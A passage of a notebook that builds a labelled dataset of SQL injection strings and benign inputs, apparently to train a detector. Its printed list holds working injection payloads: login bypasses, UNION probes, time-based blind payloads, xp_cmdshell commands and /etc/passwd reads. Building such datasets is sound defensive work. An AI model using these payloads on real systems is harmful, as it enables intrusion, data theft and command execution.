              " ' select * from users where id = 1 or \"$?\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"$ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"$ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"$ union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"$ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"$#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"$[\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"$_\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"$&\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"$@\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"_{\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' * ( \\\\ )  or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' +  ( \\\\ )  union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' +  ( \\\\. )  union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " ' select * from users where id = 1 or \"& ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"& ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"%,\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1'<@.. or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' <@.$ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' <@._ union select 1,version (  )  -- 1'\",\n",
              " ' select * from users where id = 1 or \"%.\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " \" select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
              " ' select * from users where id = 1 or \"%1\" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"%;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"%?\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' *$ . or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'\",\n",
              " \" select * from users where id = '1' *$ 1 or 1 = 1 -- 1'\",\n",
              " ' select * from users where id = 1 or \"%[\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' <@$_ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'\",\n",
              " ' select * from users where id = 1 or \"%_\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' + $+%\\\\ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' <@&1 or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' + $+%$ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'\",\n",
              " ' select * from users where id = 1 or \"%&\" or 1 = 1 -- 1',\n",
              " \" select * from users where id = '1' <@&@ or 1 = 1 -- 1'\",\n",
              " \" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'\",\n",
              " \" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'\",\n",
              " ' select * from users where id = 1 or \"%{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"@ ( \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"@ ) \" or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"@;\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"@?\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"@ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"@ union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"@ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"@#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"@%\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{ ( \" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{ ) \" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{,\" = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{.\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{1\" = 1 or 1 = 1 -- 1',\n",
              " 's',\n",
              " ' select * from users where id = 1 or \"{;\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{?\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or 1#\"{ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"{ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"{ union select \\'a\\',version (  )  -- 1',\n",
              " ' select * from users where id = 1 or 1#\"{ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"{#\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\"{ = 1 or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or @#\"{ = 1 union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 or \"{%\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{@\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 or \"{{\" or 1 = 1 -- 1',\n",
              " ' select * from users where id = 1 + @`\\\\` union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 + @<1# union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 + @<@. union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 -@<@ union select 1,version (  )  -- 1',\n",
              " ' select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1',\n",
              " ' select * from users where id = 1 -@<@ union select null,version (  )  -- 1',\n",
              " ' select * from users where id = 1 + @<@# union select null,version (  )  -- 1',\n",
              " \"'-'\",\n",
              " \"' '\",\n",
              " \"'&'\",\n",
              " \"'^'\",\n",
              " \"'*'\",\n",
              " \"' or ''-'\",\n",
              " \"' or '' '\",\n",
              " \"' or ''&'\",\n",
              " \"' or ''^'\",\n",
              " \"' or ''*'\",\n",
              " '\"-\"',\n",
              " '\" \"',\n",
              " '\"&\"',\n",
              " '\"^\"',\n",
              " '\"*\"',\n",
              " '\" or \"\"-\"',\n",
              " '\" or \"\" \"',\n",
              " '\" or \"\"&\"',\n",
              " '\" or \"\"^\"',\n",
              " '\" or \"\"*\"',\n",
              " 'or true--',\n",
              " '\" or true--',\n",
              " \"' or true--\",\n",
              " '\" )  or true--',\n",
              " \"' )  or true--\",\n",
              " \"' or 'x' = 'x\",\n",
              " \"' )  or  ( 'x' )  =  ( 'x\",\n",
              " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
              " '\" or \"x\" = \"x',\n",
              " '\" )  or  ( \"x\" )  =  ( \"x',\n",
              " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
              " 'or 1 = 1',\n",
              " 'or 1 = 1-- ',\n",
              " 'or 1 = 1#',\n",
              " 'or 1 = 1/*',\n",
              " \"admin' --\",\n",
              " \"admin' #\",\n",
              " \"admin'/*\",\n",
              " \"admin' or '1' = '1\",\n",
              " \"admin' or '1' = '1'--\",\n",
              " \"admin' or '1' = '1'#\",\n",
              " \"admin' or '1' = '1'/*\",\n",
              " \"admin'or 1 = 1 or '' = '\",\n",
              " \"admin' or 1 = 1\",\n",
              " \"admin' or 1 = 1--\",\n",
              " \"admin' or 1 = 1#\",\n",
              " \"admin' or 1 = 1/*\",\n",
              " \"admin' )  or  ( '1' = '1\",\n",
              " \"admin' )  or  ( '1' = '1'--\",\n",
              " \"admin' )  or  ( '1' = '1'#\",\n",
              " \"admin' )  or  ( '1' = '1'/*\",\n",
              " \"admin' )  or '1' = '1\",\n",
              " \"admin' )  or '1' = '1'--\",\n",
              " \"admin' )  or '1' = '1'#\",\n",
              " \"admin' )  or '1' = '1'/*\",\n",
              " \"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
              " 'admin\" --',\n",
              " 'admin\" #',\n",
              " 'admin\"/*',\n",
              " 'admin\" or \"1\" = \"1',\n",
              " 'admin\" or \"1\" = \"1\"--',\n",
              " 'admin\" or \"1\" = \"1\"#',\n",
              " 'admin\" or \"1\" = \"1\"/*',\n",
              " 'admin\"or 1 = 1 or \"\" = \"',\n",
              " 'admin\" or 1 = 1',\n",
              " 'admin\" or 1 = 1--',\n",
              " 'admin\" or 1 = 1#',\n",
              " 'admin\" or 1 = 1/*',\n",
              " 'admin\" )  or  ( \"1\" = \"1',\n",
              " 'admin\" )  or  ( \"1\" = \"1\"--',\n",
              " 'admin\" )  or  ( \"1\" = \"1\"#',\n",
              " 'admin\" )  or  ( \"1\" = \"1\"/*',\n",
              " 'admin\" )  or \"1\" = \"1',\n",
              " 'admin\" )  or \"1\" = \"1\"--',\n",
              " 'admin\" )  or \"1\" = \"1\"#',\n",
              " 'admin\" )  or \"1\" = \"1\"/*',\n",
              " '1234 \" AND 1 = 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
              " \"'sqlvuln\",\n",
              " \"'+sqlvuln\",\n",
              " 'sqlvuln;',\n",
              " ' ( sqlvuln ) ',\n",
              " \"a' or 1 = 1--\",\n",
              " '\"a\"\" or 1 = 1--\"',\n",
              " ' or a  =  a',\n",
              " \"a' or 'a'  =  'a\",\n",
              " '1 or 1 = 1',\n",
              " \"a' waitfor delay '0:0:10'--\",\n",
              " \"1 waitfor delay '0:0:10'--\",\n",
              " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
              " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
              " '0',\n",
              " '031003000270000',\n",
              " 'declare @s varchar ( 22 )  select @s  = ',\n",
              " '0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
              " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
              " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e',\n",
              " 'exec ( @s ) ',\n",
              " \"a'\",\n",
              " '?',\n",
              " \"' or 1 = 1\",\n",
              " '‘ or 1 = 1 --',\n",
              " \"x' AND userid IS NULL; --\",\n",
              " \"x' AND email IS NULL; --\",\n",
              " \"anything' OR 'x' = 'x\",\n",
              " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
              " \"x' AND members.email IS NULL; --\",\n",
              " \"x' OR full_name LIKE '%Bob%\",\n",
              " '23 OR 1 = 1',\n",
              " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
              " \"'\",\n",
              " \"' or '' = '\",\n",
              " \"' or 'x' = 'x\",\n",
              " ' or x = x',\n",
              " \"' )  or  ( 'x' = 'x\",\n",
              " '0 or 1 = 1',\n",
              " \"' or 0 = 0 --\",\n",
              " '\" or 0 = 0 --',\n",
              " 'or 0 = 0 --',\n",
              " \"' or 0 = 0 #\",\n",
              " ' or 0 = 0 #\"',\n",
              " 'or 0 = 0 #',\n",
              " \"' or 1 = 1--\",\n",
              " '\" or 1 = 1--',\n",
              " \"' or '1' = '1'--\",\n",
              " \"' or 1 --'\",\n",
              " 'or 1 = 1--',\n",
              " 'or 1 = 1',\n",
              " 'or 1 = 1 --',\n",
              " \"' or 1 = 1 or '' = '\",\n",
              " ' or 1 = 1 or \"\" = ',\n",
              " \"' or a = a--\",\n",
              " ' or a = a',\n",
              " \"' )  or  ( 'a' = 'a\",\n",
              " ' )  or  ( a = a',\n",
              " 'hi or a = a',\n",
              " 'hi or 1 = 1 --\"',\n",
              " \"hi' or 1 = 1 --\",\n",
              " \"hi' or 'a' = 'a\",\n",
              " \"hi' )  or  ( 'a' = 'a\",\n",
              " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
              " \"'hi' or 'x' = 'x';\",\n",
              " '@variable',\n",
              " ',@variable',\n",
              " 'PRINT',\n",
              " 'PRINT @@variable',\n",
              " 'select',\n",
              " 'insert',\n",
              " 'as',\n",
              " 'or',\n",
              " 'procedure',\n",
              " 'limit',\n",
              " 'order by',\n",
              " 'asc',\n",
              " 'desc',\n",
              " 'delete',\n",
              " 'update',\n",
              " 'distinct',\n",
              " 'having',\n",
              " 'truncate',\n",
              " 'replace',\n",
              " 'like',\n",
              " 'handler',\n",
              " 'bfilename',\n",
              " \"' or username like '%\",\n",
              " \"' or uname like '%\",\n",
              " \"' or userid like '%\",\n",
              " \"' or uid like '%\",\n",
              " \"' or user like '%\",\n",
              " 'exec xp',\n",
              " 'exec sp',\n",
              " \"'; exec master..xp_cmdshell\",\n",
              " \"'; exec xp_regread\",\n",
              " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
              " '--sp_password',\n",
              " '\\\\x27UNION SELECT',\n",
              " \"' UNION SELECT\",\n",
              " \"' UNION ALL SELECT\",\n",
              " \"' or  ( EXISTS ) \",\n",
              " \"'  ( select top 1\",\n",
              " \"'||UTL_HTTP.REQUEST\",\n",
              " '1;SELECT *',\n",
              " 'to_timestamp_tz',\n",
              " 'tz_offset',\n",
              " '<>\"\\'%; )  ( &+',\n",
              " \"' or 1 = 1\",\n",
              " '%27 or 1 = 1',\n",
              " ' $ ( sleep 50 ) ',\n",
              " \" 'sleep 50'\",\n",
              " 'char%4039%41%2b%40SELECT',\n",
              " '&apos; OR',\n",
              " \"'sqlattempt1\",\n",
              " ' ( sqlattempt2 ) ',\n",
              " '|',\n",
              " '%7C',\n",
              " '*|',\n",
              " '%2A%7C',\n",
              " '* ( | ( mail = *  )  )  ',\n",
              " '%2A%28%7C%28mail%3D%2A%29%29',\n",
              " '* ( | ( objectclass = *  )  )  ',\n",
              " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
              " ' ( ',\n",
              " '%28',\n",
              " ' ) ',\n",
              " '%29',\n",
              " '&',\n",
              " '%26',\n",
              " '!',\n",
              " '%21',\n",
              " \"' or 1 = 1 or '' = '\",\n",
              " \"' or '' = '\",\n",
              " \"x' or 1 = 1 or 'x' = 'y\",\n",
              " '/',\n",
              " '//',\n",
              " '//*',\n",
              " '*/*',\n",
              " \"a' or 3 = 3--\",\n",
              " '\"a\"\" or 3 = 3--\"',\n",
              " \"' or 3 = 3\",\n",
              " '‘ or 3 = 3 --',\n",
              " \" )  or  ( 'x' = 'x\",\n",
              " ' or 1 = 1',\n",
              " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
              " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " 'update',\n",
              " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
              " '1 )  or pg_sleep ( __TIME__ ) --',\n",
              " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
              " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
              " 'delete',\n",
              " 'like',\n",
              " '\" or sleep ( __TIME__ ) #',\n",
              " 'pg_sleep ( __TIME__ ) --',\n",
              " '* ( | ( objectclass = *  )  )  ',\n",
              " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...',\n",
              " ' or 0 = 0 #',\n",
              " 'insert',\n",
              " '1 )  or sleep ( __TIME__ ) #',\n",
              " \" )  or  ( 'a' = 'a\",\n",
              " '; exec xp_regread',\n",
              " '*|',\n",
              " '@var select @var as var into temp end --',\n",
              " '1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " 'asc',\n",
              " ' ( ||6 ) ',\n",
              " '\"a\"\" or 3 = 3--\"',\n",
              " '\" or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " '# from wapiti',\n",
              " ' or 0 = 0 --',\n",
              " \"1 waitfor delay '0:0:10'--\",\n",
              " \" or 'a' = 'a\",\n",
              " 'hi or 1 = 1 --\"',\n",
              " 'or a  =  a',\n",
              " ' UNION ALL SELECT',\n",
              " \" )  or sleep ( __TIME__ )  = '\",\n",
              " '  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " \"hi' or 'a' = 'a\",\n",
              " '0',\n",
              " '21 %',\n",
              " 'limit',\n",
              " ' or 1 = 1',\n",
              " ' or 2 > 1',\n",
              " '\"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " 'PRINT',\n",
              " \"hi' )  or  ( 'a' = 'a\",\n",
              " ' or 3 = 3',\n",
              " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
              " \"a' waitfor delay '0:0:10'--\",\n",
              " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...',\n",
              " 'or 1 = 1',\n",
              " '1 or sleep ( __TIME__ ) #',\n",
              " 'or 1 = 1',\n",
              " ' and 1 in  ( select var from temp ) --',\n",
              " \" or '7659' = '7659\",\n",
              " \" or 'text'  =  n'text'\",\n",
              " ' --',\n",
              " \" or 1 = 1 or '' = '\",\n",
              " 'declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...',\n",
              " 'exec xp',\n",
              " \"; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
              " '3.10E+17',\n",
              " '\" or pg_sleep ( __TIME__ ) --',\n",
              " \"x' AND email IS NULL; --\",\n",
              " '&',\n",
              " \"admin' or '\",\n",
              " \" or 'unusual'  =  'unusual'\",\n",
              " '//',\n",
              " 'truncate',\n",
              " '1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " '\\\\x27UNION SELECT',\n",
              " 'declare @s varchar ( 200 )  select @s  =  0x77616974 ...',\n",
              " 'tz_offset',\n",
              " 'sqlvuln',\n",
              " '\"  )  )  ;waitfor delay \\'0:0:__TIME__\\'--',\n",
              " '||6',\n",
              " 'or 1 = 1 --',\n",
              " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
              " 'or a = a',\n",
              " ' )  union select * from information_schema.tables;',\n",
              " 'PRINT @@variable',\n",
              " 'or isNULL ( 1/0 )  /*',\n",
              " '26 %',\n",
              " '\" or \"a\" = \"a',\n",
              " ' ( sqlvuln ) ',\n",
              " \"x' AND members.email IS NULL; --\",\n",
              " ' or 1 = 1--',\n",
              " ' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...',\n",
              " '0x770061006900740066006F0072002000640065006C00 ...',\n",
              " \" 'sleep 50'\",\n",
              " 'as',\n",
              " '1  )  )   or pg_sleep ( __TIME__ ) --',\n",
              " '/**/or/**/1/**/ = /**/1',\n",
              " ' union all select @@version--',\n",
              " ',@variable',\n",
              " ' ( sqlattempt2 ) ',\n",
              " ' or  ( EXISTS ) ',\n",
              " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\",\n",
              " ' $ ( sleep 50 ) ',\n",
              " '1 or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " \" or '' = '\",\n",
              " '||UTL_HTTP.REQUEST',\n",
              " ' or pg_sleep ( __TIME__ ) --',\n",
              " \"hi' or 'x' = 'x';\",\n",
              " '\" )  or sleep ( __TIME__ )  = \"',\n",
              " \" or 'whatever' in  ( 'whatever' ) \",\n",
              " \"; begin declare @var varchar ( 8000 )  set @var = ' ...\",\n",
              " \" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
              " '0x77616974666F722064656C61792027303A303A313027 ...',\n",
              " 'exec ( @s ) ',\n",
              " ' )  or pg_sleep ( __TIME__ ) --',\n",
              " ' union select',\n",
              " ' or sleep ( __TIME__ ) #',\n",
              " ' select * from information_schema.tables--',\n",
              " \"a' or 1 = 1--\",\n",
              " \"a' or 'a'  =  'a\",\n",
              " 'declare @s varchar ( 22 )  select @s  = ',\n",
              " ' or 2 between 1 and 3',\n",
              " ' or a = a--',\n",
              " \" or '1' = '1\",\n",
              " '|',\n",
              " \" or sleep ( __TIME__ )  = '\",\n",
              " \" or 1 --'\",\n",
              " 'or 0 = 0 #\"',\n",
              " 'having',\n",
              " \"a'\",\n",
              " '\" or isNULL ( 1/0 )  /*',\n",
              " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c ...',\n",
              " 'â\\x80\\x98 or 1 = 1 --',\n",
              " 'char%4039%41%2b%40SELECT',\n",
              " 'order by',\n",
              " 'bfilename',\n",
              " ' having 1 = 1--',\n",
              " ' )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
              " ' or username like char ( 37 ) ;',\n",
              " \";waitfor delay '0:0:__TIME__'--\",\n",
              " '\" or 1 = 1--',\n",
              " \"x' AND userid IS NULL; --\",\n",
              " '*/*',\n",
              " \" or 'text' > 't'\",\n",
              " '  ( select top 1',\n",
              " ...]"
            ]
          },
          "metadata": {},
          "execution_count": 184
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pandas as pd"
      ],
      "metadata": {
        "id": "PyFTuhBoaxst"
      },
      "execution_count": 185,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# give labels to sql data\n",
        "\n",
        "values=[]\n",
        "for i in all_sqli_sentence:\n",
        "    values.append((i,1))"
      ],
      "metadata": {
        "id": "XeW48AzCay-N"
      },
      "execution_count": 186,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# give labels to benign data\n",
        "\n",
        "for i in data:\n",
        "    values.append((i,0))"
      ],
      "metadata": {
        "id": "IyGIJR42a0Sm"
      },
      "execution_count": 187,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(all_sqli_sentence)+len(data)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wuMo8YRWa1iT",
        "outputId": "5cc741f0-262b-4f9c-c269-002e3a49b88e"
      },
      "execution_count": 188,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "4199"
            ]
          },
          "metadata": {},
          "execution_count": 188
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(values)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9M_ZEBeKa2pY",
        "outputId": "0413f27c-ee92-4fef-d620-dd6f660c88b8"
      },
      "execution_count": 189,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "4199"
            ]
          },
          "metadata": {},
          "execution_count": 189
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i in benign_sentence:\n",
        "    values.append((i,0))"
      ],
      "metadata": {
        "id": "82nfy0DHa37d"
      },
      "execution_count": 190,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(values)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mR2oh7C9a5BQ",
        "outputId": "670353db-0e2b-4185-d388-c4b4911bb838"
      },
      "execution_count": 191,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "5314"
            ]
          },
          "metadata": {},
          "execution_count": 191
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i in sqli_data:\n",
        "    values.append((i,1))"
      ],
      "metadata": {
        "id": "jAKuxqK6a6e_"
      },
      "execution_count": 192,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "len(values)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8E09LfFga79z",
        "outputId": "9309327e-f9b0-4d60-d1e6-481ecb7aa9ae"
      },
      "execution_count": 193,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "5604"
            ]
          },
          "metadata": {},
          "execution_count": 193
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "values[1]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "36H5cI5Ea8-r",
        "outputId": "6c36cbbe-a33a-49e4-8326-da97062ebf4a"
      },
      "execution_count": 194,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(\"a' \", 1)"
            ]
          },
          "metadata": {},
          "execution_count": 194
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# convert to dataframe\n",
        "\n",
        "df=pd.DataFrame(values,columns=['Sentence','Label'])"
      ],
      "metadata": {
        "id": "_MlLOwWGa-j-"
      },
      "execution_count": 195,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "df.head()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 206
        },
        "id": "h9FYtZhnbAKT",
        "outputId": "f8eed43c-1c3d-43d8-e04a-a41b7cc5991b"
      },
      "execution_count": 196,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "          Sentence  Label\n",
              "0                a      1\n",
              "1              a'       1\n",
              "2            a' --      1\n",
              "3  a' or 1 = 1; --      1\n",
              "4                @      1"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-19698e7f-4b3d-4977-9702-f8e5d823e4b6\">\n",
              "    <div class=\"colab-df-container\">\n",
              "      <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Sentence</th>\n",
              "      <th>Label</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>a</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>a'</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>a' --</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>a' or 1 = 1; --</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>@</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "      <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-19698e7f-4b3d-4977-9702-f8e5d823e4b6')\"\n",
              "              title=\"Convert this dataframe to an interactive table.\"\n",
              "              style=\"display:none;\">\n",
              "        \n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M0 0h24v24H0V0z\" fill=\"none\"/>\n",
              "    <path d=\"M18.56 5.44l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94zm-11 1L8.5 8.5l.94-2.06 2.06-.94-2.06-.94L8.5 2.5l-.94 2.06-2.06.94zm10 10l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94z\"/><path d=\"M17.41 7.96l-1.37-1.37c-.4-.4-.92-.59-1.43-.59-.52 0-1.04.2-1.43.59L10.3 9.45l-7.72 7.72c-.78.78-.78 2.05 0 2.83L4 21.41c.39.39.9.59 1.41.59.51 0 1.02-.2 1.41-.59l7.78-7.78 2.81-2.81c.8-.78.8-2.07 0-2.86zM5.41 20L4 18.59l7.72-7.72 1.47 1.35L5.41 20z\"/>\n",
              "  </svg>\n",
              "      </button>\n",
              "      \n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      flex-wrap:wrap;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
